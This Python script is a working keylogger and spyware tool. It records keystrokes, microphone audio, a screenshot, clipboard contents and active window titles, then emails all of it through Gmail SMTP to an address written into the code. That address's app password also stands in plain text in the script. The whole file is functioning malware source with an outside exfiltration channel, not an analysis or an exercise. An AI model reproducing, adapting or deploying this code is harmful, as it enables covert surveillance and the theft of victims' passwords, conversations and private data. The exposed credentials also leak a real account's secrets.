import threading
import time
import os
import sounddevice as sd
from scipy.io.wavfile import write
from email.mime.multipart import MIMEMultipart as MM
from email.mime.text import MIMEText as MT
from email.mime.base import MIMEBase as MB
from email import encoders
import smtplib
import pyperclip
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from PIL import ImageGrab
from datetime import datetime
import pygetwindow as pw

# Configuration constants
FILE_PATH = os.path.dirname(os.path.abspath(__file__))
EXTEND = "\\"
FILE_MERGE = FILE_PATH + EXTEND
BROWSER_INFO = "browser.txt"
AUDIO_INFO = "audioinfo.wav"
SCREENSHOT_INFO = "screenshot.png"
CLIPBOARD_INFO = "clipboard.txt"
EMAIL_ADDR = "guy1183b5@gmail.com"
PASSWORD = "yfga imkv lfoz btlw"
TO_ADDR = "guy1183b5@gmail.com"
KEY = "m9PWEdojohAwAiekEBpnK3vSgBrGIiOo4auZYE7jng8="
MICROPHONE_TIME = 10  # Duration of each recording
KEYLOGGER_DURATION = 30  # Duration for which the keylogger runs (in seconds)
KEYLOGGER_RUN_TIMES = 1  # Number of times to run the keylogger

# Global variables
count = 0
keys = []
log_lock = threading.Lock()  # Lock to prevent concurrent access to the log file
keylog_file = None  # Variable to store the keylog file for the session

# Function to send a single email with all attachments
def send_email(attachments, toaddr):
    try:
        fromaddr = EMAIL_ADDR
        msg = MM()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Log files and data"
        body = "Attached are the requested log files and data."
        msg.attach(MT(body, 'plain'))

        for filename, attachment in attachments:
            with open(attachment, 'rb') as att:
                p = MB('application', 'octet-stream')
                p.set_payload(att.read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f"attachment; filename={filename}")
                msg.attach(p)

        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, PASSWORD)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()

        print("Email sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to record audio
def microphone():
    fs = 44100  # Sample rate
    seconds = MICROPHONE_TIME
    myRecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  
    write(FILE_MERGE + AUDIO_INFO, fs, myRecording)

# Function to capture a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(FILE_MERGE + SCREENSHOT_INFO)

# Keylogger functions
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# To get the browser info of user
active_window = []
def browser():
    for i in range(5):  # Capture active window every 2 seconds for 5 iterations
        try:
            timestamp = datetime.now().strftime("%d_%H-%M-%S") 
            active_window = pw.getActiveWindow()  # Get the current active window
            with open(FILE_MERGE + BROWSER_INFO, "a") as f:
                f.write(str(active_window) + " ")  # Write window info
                f.write(timestamp + "\n")  # Append timestamp
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(2)

# Store the written keys in different documents
def write_file(keys):
    global keylog_file
    
    with log_lock:  # Lock to prevent concurrent access to the log file
        try:
            if not keylog_file:
                # Make a timestamp once to create the keylog file for the session
                timestamp = datetime.now().strftime("%d_%H-%M-%S")  
                keylog_file = FILE_MERGE + f"key_log_{timestamp}.txt"  # Create the keylog file once
                print(f"Keylog file created: {keylog_file}")
            
            with open(keylog_file, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    # Handle special keys
                    if key == Key.space:
                        f.write(" [Space] ")
                    elif key == Key.enter:
                        f.write(" [Enter] ")
                    elif key == Key.backspace:
                        f.write(" [Backspace] ")
                    elif key == Key.shift:
                        f.write(" [Shift] ")
                    elif key == Key.ctrl_l or key == Key.ctrl_r:
                        f.write(" [Ctrl] ")
                    elif key == Key.alt_l or key == Key.alt_r:
                        f.write(" [Alt] ")
                    elif key == Key.tab:
                        f.write(" [Tab] ")
                    elif key == Key.esc:
                        f.write(" [Escape] ")
                    elif k.find("Key") == -1:
                        f.write(k)
                    else:
                        f.write(f" {k} ")
                f.write('\n')
        except IOError as e:
            print(f"Error writing to file: {e}")

def on_release(key):
    if key == Key.esc:
        return False

# Function to log clipboard data
def copy_clipboard():
    with open(FILE_MERGE + CLIPBOARD_INFO, "a") as f:
        try:
            f.write(f"Clipboard data:\n{pyperclip.paste()}\n")
        except Exception as e:
            f.write(f"Error copying clipboard: {e}\n")

# Main loop to control keylogger execution
def run_keylogger():
    for _ in range(KEYLOGGER_RUN_TIMES):  # For now, run it 1 time, you can increase this number later
        with Listener(on_press=on_press, on_release=on_release) as listener:
            print(f"Keylogger running for {KEYLOGGER_DURATION} seconds...")
            listener.join(KEYLOGGER_DURATION)  # Runs keylogger for the specified duration
        print(f"Keylogger stopped for this cycle.")

# Main function
if __name__ == "__main__":
    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

    # Start the audio recording in a separate thread
    audio_thread = threading.Thread(target=microphone)
    audio_thread.start()

    # Start the screenshot capture in a separate thread
    screenshot_thread = threading.Thread(target=screenshot)
    screenshot_thread.start()

    # Start thread to track the window being used
    openWindow_thread = threading.Thread(target=browser)
    openWindow_thread.start()

    # Wait for the threads to complete
    audio_thread.join()
    screenshot_thread.join()
    keylogger_thread.join()
    openWindow_thread.join()

    # Capture clipboard after keylogging
    copy_clipboard()

    # Prepare the list of attachments
    attachments = [
        (AUDIO_INFO, FILE_MERGE + AUDIO_INFO),
        (SCREENSHOT_INFO, FILE_MERGE + SCREENSHOT_INFO),
        (CLIPBOARD_INFO, FILE_MERGE + CLIPBOARD_INFO),
        (BROWSER_INFO, FILE_MERGE + BROWSER_INFO)
    ]

    # Collect all the key log files
    log_files = [f for f in os.listdir(FILE_MERGE) if f.startswith("key_log_") and f.endswith(".txt")]
    for log_file in log_files:
        # Adding the keylogging files to the attachment
        attachments.append((log_file, FILE_MERGE + log_file))

    # Send the email with all attachments
    send_email(attachments, TO_ADDR)
